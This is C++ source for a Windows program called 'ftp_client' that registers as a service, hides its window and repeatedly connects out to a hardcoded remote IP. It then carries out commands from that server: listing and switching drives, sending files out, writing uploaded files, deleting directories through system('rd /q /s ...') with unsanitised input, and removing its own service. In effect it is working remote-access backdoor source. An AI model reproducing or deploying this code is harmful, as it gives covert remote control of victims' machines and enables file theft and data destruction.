#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <direct.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <io.h>
#include <WinSock.h>
#include <Winsock2.h>
#include <windows.h>
#include <conio.h>
#include <time.h>

extern "C" WINBASEAPI HWND WINAPI GetConsoleWindow();

#define PORT 	1518
#define SERVER_IP 	"47.105.37.18"

char root_path[1024]="D:\\QQFtp";

void cmd_ls(SOCKET sockc);
void cmd_cd(SOCKET sockc);
void cmd_upload(SOCKET sockc);
void cmd_download(SOCKET sockc);
void cmd_quit(SOCKET sockc);
void cmd_pwd(SOCKET sockc);
void cmd_fdisk(SOCKET sockc);
void cmd_rm(SOCKET sockc);
void cmd_touch(SOCKET sockc);
void cmd_mkdir(SOCKET sockc);
void cmd_audio(SOCKET sockc);
void del_service(SOCKET sockc);

/*-----------多线程相关----------------*/
int main_service();
DWORD WINAPI boom_task(LPVOID);
DWORD WINAPI client_process(LPVOID);
int reboot=0;
HANDLE hMutex;
/*------------------------------------*/

/*-----------服务相关------------------*/
void ServiceMain();//服务主函数
void WINAPI ServiceCtrlHandler(DWORD Opcode);//服务控制函数
SERVICE_STATUS m_ServiceStatus;//服务状态
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;//服务状态句柄
/*------------------------------------*/

int main()      
{
    SERVICE_TABLE_ENTRY DispatchTable[2];   

    DispatchTable[0].lpServiceName = "ftp_client";
    DispatchTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    DispatchTable[1].lpServiceName = NULL;
    DispatchTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(DispatchTable);

    return 0;
}

//服务函数入口
void ServiceMain()
{	
	//设置服务状态
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;
    m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN|SERVICE_ACCEPT_STOP;

    //注册服务控制函数
	m_ServiceStatusHandle=RegisterServiceCtrlHandler("ftp_client", ServiceCtrlHandler);
	if(m_ServiceStatusHandle == 0)
	{
		return;
	}

	//将SERVICE_RUNNING服务状态报告给服务控制器
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus);
	
    while(1)
    {
		main_service();
        Sleep(5);
    }
 
}  

void WINAPI ServiceCtrlHandler(DWORD Opcode)
{
    switch (Opcode)
    {
    case SERVICE_CONTROL_STOP://停止服务
        m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN://电脑关机
        m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }
    SetServiceStatus(m_ServiceStatusHandle,&m_ServiceStatus);
	return;
}


//-----------------服务函数实例-----------------------------------------------------------//
int main_service()
{
	//隐藏窗口
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	
	//更改工作目录
	chdir("D:\\QQFtp\\");
	
	//创建互斥锁
	hMutex=CreateMutex(NULL,FALSE,NULL);
	
    DWORD  main_threadId;
	DWORD  boom_threadId;	
	HANDLE main_Thread;
	HANDLE boom_Thread;
	
	DWORD  main_lpExitCode;//线程状态
	DWORD  boom_lpExitCode;//线程状态
	
    main_Thread = CreateThread(NULL, 0, boom_task, 0, 0, &main_threadId);
	boom_Thread = CreateThread(NULL, 0, client_process, 0, 0, &boom_threadId); 
	
	while(1)
	{
		Sleep(5);

		WaitForSingleObject(hMutex,INFINITE);
		if(reboot == 1)
		{
			Sleep(3000);
			//TerminateThread();//杀线程
			
			//判断线程是否结束
			GetExitCodeThread(main_Thread, &main_lpExitCode);
			GetExitCodeThread(boom_Thread, &boom_lpExitCode);
			if(main_lpExitCode != STILL_ACTIVE && boom_lpExitCode != STILL_ACTIVE)
			{
				//重新创建线程
				Sleep(1000);
				main_Thread = CreateThread(NULL, 0, boom_task, 0, 0, &main_threadId);
				boom_Thread = CreateThread(NULL, 0, client_process, 0, 0, &boom_threadId); 
				
				reboot = 0;
				printf("reboot!!!\n");
			}
		}
		ReleaseMutex(hMutex);
	}		
	return 0;
}

DWORD WINAPI boom_task(LPVOID p)
{
	//printf("boom_task = %d\n", GetCurrentThreadId());  
	
	WSADATA  wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	struct sockaddr_in boom_addr;
    boom_addr.sin_family = AF_INET;  
    boom_addr.sin_port = htons(1519);  
    boom_addr.sin_addr.s_addr = inet_addr("47.105.37.18");

    SOCKET boom_socket = socket(AF_INET,SOCK_STREAM,0);   
	
	int ret = -1;
	while(ret == -1)
	{
		Sleep(5);
		ret = connect(boom_socket, (struct sockaddr*)&boom_addr, sizeof(boom_addr));  	
	}	
	
	send(boom_socket, "\n#####boom_task#####", 20, 0); 
	
	//设置3s的recv超时
	int timeout = 3000; 
    setsockopt(boom_socket,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));
	
	//如果关掉server这边超时接受不会等待直接退出,整个while不能阻塞
	int offline = 0;
	char buf[1]={0};
	while(1)
	{
		Sleep(5);
		buf[0]=0;	
		send(boom_socket, "#", 1, 0); 
		recv(boom_socket, buf, 1, 0);  
		if(buf[0]=='*')
		{
			offline=0;	
		}	
		else
		{
			offline++;
			//printf("offline %d\n",offline);
		}
		
		if(offline>=20)//1min没连接重启动
		{
			offline = 20;
			WaitForSingleObject(hMutex,INFINITE);
			reboot = 1;
			ReleaseMutex(hMutex);
		
			return 0;
		}
	}	
	return 0;
}

DWORD WINAPI client_process(LPVOID p)
{
	//printf("main_task = %d\n", GetCurrentThreadId());  
	
	WSADATA  wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	
    struct sockaddr_in addrsrv;
    addrsrv.sin_family = AF_INET;  
    addrsrv.sin_port = htons(PORT);  
    addrsrv.sin_addr.s_addr = inet_addr(SERVER_IP);

    SOCKET sockc = socket(AF_INET,SOCK_STREAM,0);   
	
	//设置10s接收发送超时,主要是保证线程能退出
	int timeout = 10000; 
    setsockopt(sockc,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));
	setsockopt(sockc,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout));
	
	int ret = -1;
	while(ret == -1)
	{	
		Sleep(5);
		ret = connect(sockc, (struct sockaddr*)&addrsrv, sizeof(addrsrv));  
	}

	/************************************/
	send(sockc, "D:\\QQFtp", 8, 0);     		
	/************************************/   
	
	char cmd_buf[100] = {0};
	while(1)
	{	
		Sleep(5);
		
		memset(cmd_buf, 0, 100);

		//线程退出重启
		WaitForSingleObject(hMutex,INFINITE);
		if(reboot==1)return 0;
		ReleaseMutex(hMutex);		
		
		recv(sockc, cmd_buf, 100, 0); 

		if(memcmp(cmd_buf, "down", 4)==0)
		{
			cmd_download(sockc);
			continue;
		}
		if(memcmp(cmd_buf, "up", 2)==0)
		{
			cmd_upload(sockc);
			continue;
		}
		if(memcmp(cmd_buf, "ls", 2)==0)
		{
			cmd_ls(sockc);
			continue;
		}
		if(memcmp(cmd_buf, "cd", 2)==0)
		{
			cmd_cd(sockc);
			continue;
		}
		if(memcmp(cmd_buf, "pwd", 3)==0)
		{
			cmd_pwd(sockc);
			continue;
		}		
		if(memcmp(cmd_buf, "quit", 4)==0)
		{
			cmd_quit(sockc);
			continue;
		}	
		if(memcmp(cmd_buf, "fdisk", 5)==0)
		{
			cmd_fdisk(sockc);
			continue;
		}	
		if(memcmp(cmd_buf, "rm", 2)==0)
		{
			cmd_rm(sockc);
			continue;
		}
		if(memcmp(cmd_buf, "touch", 5)==0)
		{
			cmd_touch(sockc);
			continue;
		}
		if(memcmp(cmd_buf, "mkdir", 5)==0)
		{
			cmd_mkdir(sockc);
			continue;
		}	
		if(memcmp(cmd_buf, "audio", 5)==0)
		{
			//cmd_audio(sockc);
			//continue;
		}	
		if(memcmp(cmd_buf, "del_service", 11)==0)
		{
			del_service(sockc);
			continue;
		}		
	}

    closesocket(sockc);
    //system("pause");
    return 0;	
}

void cmd_rm(SOCKET sockc)
{
	char buf[1024+1]={0};	
	char bat_buf[512]={0};	

	recv(sockc, buf, 1024, 0);
	
	//windows下不会存在同名的目录和文件,下面函数会有一个失败
	//目录下有文件也删除
	unlink(buf);
	//RemoveDirectory(buf);
	//rmdir(buf);
	
	memcpy(bat_buf, "rd /q /s ", 9);
	memcpy(&bat_buf[9], buf, strlen(buf));
	system(bat_buf);
	
	return;
}
void cmd_touch(SOCKET sockc)
{
	char buf[1024+1]={0};	

	recv(sockc, buf, 1024, 0);
	
	FILE* fp=fopen(buf,"wb+");
	fclose(fp);
	
	return;
}
void cmd_mkdir(SOCKET sockc)
{
	char buf[1024+1]={0};	

	recv(sockc, buf, 1024, 0);
	
	//已经更改了工作目录
	_mkdir(buf);
	
	return;
}

void cmd_fdisk(SOCKET sockc)
{
	DIR *dirptr=NULL; 
	char buf[1024+1]={0};	
	
	recv(sockc, buf, 1024, 0);
	
	buf[strlen(buf)]=':';
	buf[strlen(buf)]='\\';

	dirptr=opendir(buf);
	if(dirptr!=NULL)//存在盘符
	{
		memset(root_path, 0, 1024);
		memcpy(root_path, buf, strlen(buf));
		send(sockc, buf, strlen(buf), 0); 
		
		//更改工作路径
		chdir(root_path);
	}
	else//不存在盘符
	{
		send(sockc, "no fdisk", 8, 0);
	}	
	closedir(dirptr);
	return;
}

void cmd_ls(SOCKET sockc)
{
	unsigned int all_size=0;
	char dir_list[1024*50]={0};
	
	//dir显示目录输出到管道
	FILE* fp = _popen("dir", "r");
	
	//一次性复制到dir_list,可能越界
	all_size=fread(dir_list, 1, 1024*50, fp);

	//一次性发送
	send(sockc, dir_list, all_size, 0); 
	
	//关闭
	_pclose(fp);
	
	return ;
}


void cmd_cd(SOCKET sockc)
{
	char buf[1024+1]={0};	
	char new_root_path[1024]={0};

	//接收cd目录,拼接目录
	recv(sockc, buf, 1024, 0);
	
	//拼装新路径
	memcpy(new_root_path, root_path, strlen(root_path));
	new_root_path[strlen(new_root_path)]='\\';
	memcpy(&(new_root_path[strlen(new_root_path)]), buf, strlen(buf));
	//printf("1---%s---1\n", new_root_path);
	
	
	//目录不存在
	if(access(new_root_path, 0)<0)
	{
		send(sockc, "no such directory!", 18, 0); 
		return ;
	}
	
	//目录存在,更改工作路径
	if(chdir(new_root_path)<0)
	{
		send(sockc, "no such directory!", 18, 0); 
		return ;
	}
	
	//获取当前工作路径
	memset(buf,0,1024+1);
	getcwd(buf, 1024);
	//printf("%s\n", buf);
	
	//更新路径
	memset(root_path,0,strlen(root_path));
	memcpy(root_path, buf, strlen(buf));
	//printf("2---%s---2\n", root_path);
	
	//发送路径
	send(sockc, root_path, strlen(root_path), 0); 
	
	return ;
}

void cmd_download(SOCKET sockc)
{
	FILE* fp=NULL;
	struct stat file_info={0};
	int read_count=0;
	int send_size=0;
	unsigned int all_size=0;
	char buf[1024+1]={0};	
	char file_path[512]={0};
	
	//接受文件名
	recv(sockc, buf, 1024, 0);

	//绝对路径
	memcpy(file_path, root_path, strlen(root_path));
	file_path[strlen(file_path)]='\\';
	memcpy(&(file_path[strlen(file_path)]), buf, strlen(buf));
	//printf("%s\n", file_path);
	
	//文件是否存在
	fp=fopen(file_path,"rb");
	if(fp == NULL)
	{
		send(sockc, "no such file!", 13, 0); 
		return ;
	}

	send(sockc, "ok!", 3, 0); 
	
	//发送文件大小(int 类型有符号)
	stat(file_path,&file_info);
	if(file_info.st_size<0)
	{
		all_size = (4294967295+file_info.st_size+1);
	}
	else
	{
		all_size = file_info.st_size;
	}	
	send(sockc, (char*)(&all_size), 4, 0); 

	//文件大小为0
	if(file_info.st_size==0)
	{
		fclose(fp);
		return;
	}

	//文件大小不为0
	while(!feof(fp))
	{
		memset(buf, 0, 1024+1);	
		read_count=fread(buf, 1, 1024, fp);
		send_size=send(sockc, buf, read_count, 0);  
	}
	fclose(fp);		
}


void cmd_upload(SOCKET sockc)
{
	FILE* fp=NULL;
	char buf[1024+1]={0};
	int get_size=0;
	unsigned int file_size = 0;
	char file_path[512]={0};
	
	//接受文件名并创建文件(覆盖问题)
	recv(sockc, buf, 1024, 0);	

	memcpy(file_path, root_path, strlen(root_path));
	file_path[strlen(file_path)]='\\';
	memcpy(&file_path[strlen(file_path)], buf, strlen(buf));
 
	fp=fopen(file_path,"wb+");	

	//接受文件大小
	recv(sockc, (char*)(&file_size), 4, 0);	
	
	//接受文件
	while(file_size)
	{
		memset(buf, 0, 1024+1);
		get_size = recv(sockc, buf, 1024, 0);
		fwrite(buf, get_size ,1 ,fp);	
		file_size = file_size-get_size;
	}

	fclose(fp); 	
}
void cmd_quit(SOCKET sockc)
{
	//关闭服务实例,服务状态就停止了,重启后会重新启动
	//sc delete ftp_client 
	system("taskkill /F /IM ftp_client.exe");
	//Sleep(2000);
	//system("sc delete ftp_client");
	
	//停止服务
	//m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	//SetServiceStatus(m_ServiceStatusHandle,&m_ServiceStatus);
	
	return ;
}

void del_service(SOCKET sockc)
{
	//打开服务数据库
	SC_HANDLE shOSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	//打开服务
	SC_HANDLE shCS = OpenService(shOSCM, "ftp_client", SERVICE_ALL_ACCESS);
	
	//开始服务
	//StartService(shCS, 0, NULL);
	//控制服务
	//SERVICE_STATUS ss;
	//ControlService(shCS, SERVICE_CONTROL_STOP, &ss);
	
	//删除服务
	DeleteService(shCS);
	
	if(shOSCM)
	CloseServiceHandle(shOSCM);

	if(shCS)
	CloseServiceHandle(shCS);

	//杀掉服务实例,服务会停止,注意先删除服务后删除进程
	system("taskkill /F /IM ftp_client.exe");
	
	//删不掉
	//system("rd /q /s D:\\QQFtp");

	return ;
}

void cmd_pwd(SOCKET sockc)
{
	send(sockc, root_path, strlen(root_path), 0); 
	return ;
}

void cmd_audio(SOCKET sockc)
{

	return;
} 









/* VOID APIENTRY boom_package(PVOID arg1,DWORD arg2,DWORD arg3)
{
}
void timer()
{
 	//-------------------创建定时器1s---------------------	
	HANDLE hTimer = CreateWaitableTimer(NULL,FALSE,NULL );
	LARGE_INTEGER li;
	li.QuadPart = -10000000;//1s后开始
	SetWaitableTimer(hTimer,&li,5000,boom_package,NULL,FALSE);//5s周期
	
	while(1)
	{
		SleepEx(1000,TRUE);
		//定时器里面可以加任务
	}		
} */


//目录操作
//https://www.cnblogs.com/coolcpp/p/windowsfile.html


//system("taskkill /F /IM ftp_client.exe && start D:\\QQFtp\\run.exe");
//ShellExecute(0, "open", "cmd.exe", "/C D:\\main.exe", NULL, SW_HIDE);





























